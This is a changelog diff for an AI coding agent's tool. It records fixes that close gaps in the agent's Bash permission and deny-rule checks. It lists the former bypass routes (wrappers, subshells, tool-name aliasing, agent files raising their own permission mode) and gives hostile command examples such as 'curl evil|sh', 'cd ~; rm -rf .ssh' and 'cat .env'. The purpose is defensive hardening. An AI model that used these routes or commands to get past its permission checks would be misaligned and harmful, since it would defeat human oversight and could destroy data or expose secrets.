@@ -10,6 +10,67 @@ version.
 
 ## [unreleased]
 
+### vibes/review.md fix pass, round 4 (R8: deny-rule integrity)
+
+The permission contract, hardened -- per the standing order this round
+makes the ONE gate that exists (explicit deny/ask rules) actually hold,
+and adds nothing to auto mode with no rules: every fix is pinned by
+`tests/test_review2_round4.py`'s invariant -- *deny when a deny rule
+exists, stay allowed in auto when none does*. The review's
+classifier-shaped suggestions (env-var allowlists, allow-match
+substitution refusal, blanket here-string rejection, the sed/redirect
+heuristic pile) remain intentionally NOT applied.
+
+- **f1:** a here-string (`<<<`) is no longer mis-parsed as a heredoc --
+  `cat <<< x; curl evil|sh` splits into two commands again (the old
+  parse swallowed the whole line as a "heredoc body", hiding everything
+  after the here-string from both allow and deny matching).
+- **f2:** deny rules survive wrappers, grouping and re-naming:
+  `nice -n 5 rm`, `timeout -s KILL 5 rm`, `sudo -u root rm`, `env -i
+  rm`, `xargs -0 rm` (per-wrapper value-option stripping), `( rm )`,
+  `{ rm; }`, `<(rm)`, `$(true; rm)` (group/subshell bodies, and their
+  own segment splits), `/bin/rm` (basename candidates), and `eval` /
+  `bash -c` (opaque to the matcher: asked about whenever a Bash deny/ask
+  rule exists, untouched in auto with none).
+- **f5:** the read-only git whitelist no longer runs commands or mutates:
+  `git grep -O<cmd>`/`--open-files-in-pager` blocked; `branch`/`tag`
+  read-only only in their LIST forms (`git branch newname` and
+  `git tag -d` were "read-only").
+- **f6 (contained):** the acceptEdits edit-in-workdir auto-allow drops
+  `sed` (its `e` command executes a shell), and rejects redirects,
+  `--opt=path` with path separators, and glob/brace tokens
+  (`touch a >~/.bashrc`, `cp a --target-directory=/etc`,
+  `rm -rf {..,x}` no longer auto-allow).
+- **f7:** Bash paths are judged against the LIVE working directory --
+  `cd ~; rm -rf .ssh` is no longer auto-allowed in acceptEdits as
+  `<project>/.ssh` (a per-segment cwd tracker with `cd`/`cd ..`/
+  `cd ~` handling; unknowable destinations fail closed).
+- **f8:** `Task` is canonicalized to `Agent` before any rule matching,
+  and a bare `Agent` deny also removes `Task` from the catalog -- the
+  alias no longer escapes `Agent(...)` rules.
+- **f9:** plan mode's write ban now runs BEFORE allow rules (an allow
+  rule for `Edit` or `Bash(npm:*)` can no longer let writes or
+  `npm install` through in plan mode; reads and the exempt no-side-effect
+  tools are unaffected).
+- **f10:** Read deny path rules also gate Bash file-reader commands,
+  resolved against the live cwd -- `Read(.env)` denied means
+  `cat .env` and `cd sub; cat .env` don't sail through (Read-ASK rules
+  get the same treatment outside auto/bypass).
+- **f11:** a `project:`/`plugin:`-sourced agent file can no longer raise
+  its own `permissionMode` (bypassPermissions / escaping plan mode) or
+  merge its own `hooks` -- and no agent, from any source, runs more
+  permissive than its parent.
+- **f12:** `/improve`'s model-chosen target path is contained: absolute
+  paths, `..`, and subpaths rejected; the resolved path is verified
+  inside the memory/rules/skills base directory.
+- **f13:** `halo completion bash|zsh` only emits words made of
+  shell-inert characters -- a poisoned OpenRouter catalog ID can no
+  longer execute through `eval "$(halo completion bash)"`.
+
+Suites re-run green: permissions 73/73, review2-round4 8/8,
+auto_mode 10/10, permission hotfixes 13/13, agents_md 72/72,
+agents_teams 35/35, improve_apply 9/9, completion 8/8.
+
 ### vibes/review.md fix pass, rounds 2+3 (credentials, data loss, MCP, TUI crashes)
 
 The owner's own whole-tree review of 2.0.7 -- rounds 2 (R5) and 3
